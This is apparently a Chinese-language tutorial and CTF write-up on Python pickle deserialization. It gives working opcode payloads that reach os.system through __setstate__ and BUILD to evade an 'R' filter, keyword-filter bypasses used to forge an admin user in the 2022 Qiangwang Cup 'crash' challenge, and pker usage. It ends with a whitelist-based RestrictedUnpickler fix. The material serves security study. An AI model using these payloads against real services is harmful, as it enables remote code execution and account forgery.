+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age=<span class="number">0</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;name: <span class="subst">&#123;self.name&#125;</span>\nage: <span class="subst">&#123;self.age&#125;</span>&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;invoke __setstate__&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.name=state</span><br><span class="line">        <span class="variable language_">self</span>.age=<span class="number">10</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;invoke __getstate__&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Child&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">c1=Child(<span class="string">&quot;TEST&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="comment">#name: TEST</span></span><br><span class="line"><span class="comment">#age: 0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">opcode=pickle.dumps(c1,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"><span class="comment">#invoke __getstate__</span></span><br><span class="line"><span class="comment">#b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nChild\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\nVChild\np5\nb.&#x27;</span></span><br><span class="line"> </span><br><span class="line">c2=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"><span class="comment">#invoke __setstate__</span></span><br><span class="line"><span class="comment">#name: Child</span></span><br><span class="line"><span class="comment">#age: 10</span></span><br></pre></td></tr></table></figure>
+
+<p>当对象被序列化时，会调用 __getstate__；被反序列化时，会调用 __setstate__，在重写的时候，可以忽略 __setstate__，但是 __getstate__ 必须要求返回一个字典</p>
+<p>如果两个方法都被省略，默认自动保存和加载对象的属性字典 _<em>dict</em>_</p>
+<p>在 pickle 中，字节码 b 对应的是 load_build() 函数，我们来看看他的具体使用</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">    stack = <span class="variable language_">self</span>.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    <span class="comment">#首先获取栈上的字节码b前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict</span></span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#获取该字典中键名为&quot;__setstate__&quot;的value</span></span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="comment">#如果存在，则执行value(state)</span></span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="comment">#如果&quot;__setstate__&quot;为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span></span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="comment">#如果__setstate__和__getstate__都没有设置，则加载默认__dict__</span></span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br></pre></td></tr></table></figure>
+
+<p>当我们把字典 <code>&#123;&quot;__setstate__&quot;:os.syste,&#125;</code> 压入栈中并且执行字节码 b，由于此时并没有 __setstate__，因此这里字节码 b 相当于执行了 __dict__.update，即向对象的属性字典里添加了一对新的键值对</p>
+<p>如果我们继续向栈中压入命令 command，再次执行字节码 b，由于此时已经存在了 __setstate__，因此会将栈中字节码 b 的前一个元素当做 state，并执行 __setstate__(state)，在这里，也就是 os.system(command)</p>
+<p>payload 如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Casual&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;    #向栈中压入一个空字典，然后再通过u修改为&#123;&quot;__setstate__&quot;:os.system&#125;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>测试绕过，执行结果如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> stao</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.category = category</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> <span class="variable language_">self</span>.name == other.name <span class="keyword">and</span> <span class="variable language_">self</span>.category == other.category</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no reduce!&#x27;</span></span><br><span class="line">    x=pickle.loads(data)</span><br><span class="line">    <span class="keyword">if</span>(x!= Animal(stao.name,stao.age)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not equal&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;well done! &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(stao.name,stao.age))</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Casual&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line">check(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">xiaoh\<span class="number">34946</span></span><br><span class="line"><span class="keyword">not</span> equal</span><br><span class="line">    <span class="number">0</span>: (    MARK</span><br><span class="line">    <span class="number">1</span>: c        GLOBAL     <span class="string">&#x27;__main__ Animal&#x27;</span></span><br><span class="line">   <span class="number">18</span>: S        STRING     <span class="string">&#x27;Casual&#x27;</span></span><br><span class="line">   <span class="number">28</span>: I        INT        <span class="number">18</span></span><br><span class="line">   <span class="number">32</span>: o        OBJ        (MARK at <span class="number">0</span>)</span><br><span class="line">   <span class="number">33</span>: &#125;    EMPTY_DICT</span><br><span class="line">   <span class="number">34</span>: (    MARK</span><br><span class="line">   <span class="number">35</span>: S        STRING     <span class="string">&#x27;__setstate__&#x27;</span></span><br><span class="line">   <span class="number">51</span>: c        GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line">   <span class="number">62</span>: u        SETITEMS   (MARK at <span class="number">34</span>)</span><br><span class="line">   <span class="number">63</span>: b    BUILD</span><br><span class="line">   <span class="number">64</span>: S    STRING     <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">74</span>: b    BUILD</span><br><span class="line">   <span class="number">75</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h4><p>在某些场景，我们需要通过利用 opcode 来进行变量覆盖，从而伪造我们的身份，但是代码中可能会过滤我们想要覆盖的属性关键字，我们以 2022 强网杯 crash 为例</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username,password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username=username</span><br><span class="line">        <span class="variable language_">self</span>.token=<span class="built_in">hash</span>(password)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/balancer&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    pickle_data=base64.b64decode(request.cookies.get(<span class="string">&quot;userdata&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> pickle_data <span class="keyword">or</span> <span class="string">b&quot;secret&quot;</span> <span class="keyword">in</span> pickle_data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You damm hacker!&quot;</span></span><br><span class="line">    os.system(<span class="string">&quot;rm -rf *py*&quot;</span>)</span><br><span class="line">    userdata=pickle.loads(pickle_data)</span><br><span class="line">    <span class="keyword">if</span> userdata.token!=<span class="built_in">hash</span>(get_password(userdata.username)):</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Login First&quot;</span></span><br><span class="line">    <span class="keyword">if</span> userdata.username==<span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Welcome admin, here is your next challenge!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;You&#x27;re not admin!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在源码中，引入了 admin 模块，里面存放了 secret 属性</p>
+<h5 id="V-指令进行-Unicode-绕过"><a href="#V-指令进行-Unicode-绕过" class="headerlink" title="V 指令进行 Unicode 绕过"></a>V 指令进行 Unicode 绕过</h5><p>V 指令的使用方法如下，与指令 S 类似</p>
+<p><img src="file:///C:\Users\Administrator\AppData\Roaming\Tencent\Users\1751359640\QQ\WinTemp\RichOle\KONHKM57ZAVC07`[5U4XBGF.png" alt="img"></p>
+<p>正常来说，我们的构造方法如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(S&#x27;secret&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>由于此时对 secret 进行了过滤，因此我们可以采用 Unicode 编码来绕过</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(Vsecr\u0065t</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="十六进制绕过"><a href="#十六进制绕过" class="headerlink" title="十六进制绕过"></a>十六进制绕过</h5><p>指令 S 也能识别十六进制，可以如下构造</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">b&#x27;&#x27;&#x27;capp</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(S&#x27;\x73ecret&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db0(capp</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">S&quot;admin&quot;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="利用内置函数获取关键字"><a href="#利用内置函数获取关键字" class="headerlink" title="利用内置函数获取关键字"></a>利用内置函数获取关键字</h5><p>对于已经导入的模块，我们可以通过 sys.moudles[‘xxx’] 来获取该模块，然后通过内置函数 dir 来列出模块中的所有属性</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;admin&#x27;</span>]))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;secret&#x27;]</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，我们所需要的字符串在列表的末尾</p>
+<p>虽然 pickle 不支持列表索引和字典索引，但是我们可以通过 python 中一些对列表操作的函数来返回我们所需要的值</p>
+<p>在这里，我们给出的 payload 如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">next</span>(<span class="built_in">reversed</span>(<span class="built_in">dir</span>(sys.modules[<span class="string">&#x27;admin&#x27;</span>]))))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#secret</span></span><br></pre></td></tr></table></figure>
+
+<p>因此 opcode 可以如下构造</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(((((c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">dir</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">reversed</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">next</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#secret</span></span><br></pre></td></tr></table></figure>
+
+<p>那么下面就是变量覆盖了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode = <span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">(((((c__main__</span></span><br><span class="line"><span class="string">admin</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">dir</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">reversed</span></span><br><span class="line"><span class="string">i__builtin__</span></span><br><span class="line"><span class="string">next</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">db(S&#x27;admin&#x27;</span></span><br><span class="line"><span class="string">I1</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">User</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Pker-工具的使用"><a href="#Pker-工具的使用" class="headerlink" title="Pker 工具的使用"></a>Pker 工具的使用</h1><p><a href="https://github.com/eddieivan01/pker">pker</a> 是由 <a href="https://xz.aliyun.com/t/7012#toc-0">@eddieivan01</a> 编写的以遍历Python AST的形式来自动化解析 pickle opcode 的工具</p>
+<h2 id="Pker-功能"><a href="#Pker-功能" class="headerlink" title="Pker 功能"></a>Pker 功能</h2><ul>
+<li>变量赋值：存到memo中，保存memo下标和变量名即可</li>
+<li>函数调用</li>
+<li>类型字面量构造</li>
+<li>list和dict成员修改</li>
+<li>对象成员变量修改</li>
+</ul>
+<h2 id="使用方法和示例"><a href="#使用方法和示例" class="headerlink" title="使用方法和示例"></a>使用方法和示例</h2><p>pker 主要有三个函数：GLOBAL()，INST() 和 OBJ()</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)             =&gt;  cos\nsystem\n</span><br><span class="line">INST(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;ls&#x27;</span>)         =&gt;  (S<span class="string">&#x27;ls&#x27;</span>\nios\nsystem\n</span><br><span class="line">OBJ(GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>), <span class="string">&#x27;ls&#x27;</span>)  =&gt;  (cos\nsystem\nS<span class="string">&#x27;ls&#x27;</span>\no</span><br></pre></td></tr></table></figure>
+
+<p>return 后可以返回一个对象</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>           =&gt;  .</span><br><span class="line"><span class="keyword">return</span> var       =&gt;  g_\n.</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>         =&gt;  I1\n.</span><br></pre></td></tr></table></figure>
+
+<p>也可以和 python 的语法结合起来</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pker_test.py</span></span><br><span class="line"> </span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">s = <span class="string">&#x27;id&#x27;</span></span><br><span class="line">lst = [i]</span><br><span class="line">tpl = (<span class="number">0</span>,)</span><br><span class="line">dct = &#123;tpl: <span class="number">0</span>&#125;</span><br><span class="line">system = GLOBAL(<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">system(s)</span><br><span class="line"><span class="keyword">return</span></span><br></pre></td></tr></table></figure>
+
+<p>最后导出我们需要的 opcode</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#命令行下</span></span><br><span class="line">$ python3 pker.py &lt; pker_tests.py</span><br><span class="line"> </span><br><span class="line">b<span class="string">&quot;I0\np0\n0S&#x27;id&#x27;\np1\n0(g0\nlp2\n0(I0\ntp3\n0(g3\nI0\ndp4\n0cos\nsystem\np5\n0g5\n(g1\ntR.&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="官方修复建议"><a href="#官方修复建议" class="headerlink" title="官方修复建议"></a>官方修复建议</h1><p>对于 pickle 反序列化漏洞，官方的第一个建议就是永远不要 unpickle 来自于不受信或者未经验证来源的数据</p>
+<p>第二个就是通过重写 Unpickler.find._class() 来限制全局变量</p>
+<p>下面是官方的例子</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">safe_builtins = &#123;</span><br><span class="line">    <span class="string">&#x27;range&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;complex&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;frozenset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;slice&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#重写了find_class方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">in</span> safe_builtins:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&quot;cos\nsystem\n(S&#x27;echo hello world&#x27;\ntR.&quot;</span></span><br><span class="line">restricted_loads(opcode)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">###结果如下</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">_pickle.UnpicklingError: <span class="keyword">global</span> <span class="string">&#x27;os.system&#x27;</span> <span class="keyword">is</span> forbidden</span><br></pre></td></tr></table></figure>
+
+<p>这里通过重写 Unpickler.find_class() 方法，限制调用模块只能是 builtins，并且函数必须在白名单内，否则会抛出异常</p>
+<p>这种方式限制了调用的模块函数都在白名单内，保证了 unpickle 时的安全性，同时也推荐使用白名单，黑名单总是容易引发事故</p>
+<p>但是如果对模块和函数的限制没有那么严格的话，仍然会存在可能绕过</p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://xz.aliyun.com/t/12367?time__1311=GqGxRDy7iQdxlxH3nxWw24jOAxnljYD#toc-8">https://xz.aliyun.com/t/12367?time__1311=GqGxRDy7iQdxlxH3nxWw24jOAxnljYD#toc-8</a></p>
+<p><a href="https://tttang.com/archive/1885/#toc_shell">https://tttang.com/archive/1885/#toc_shell</a></p>
+<p><a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p>
+<p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>
 ]]></content>
   </entry>
 </search>
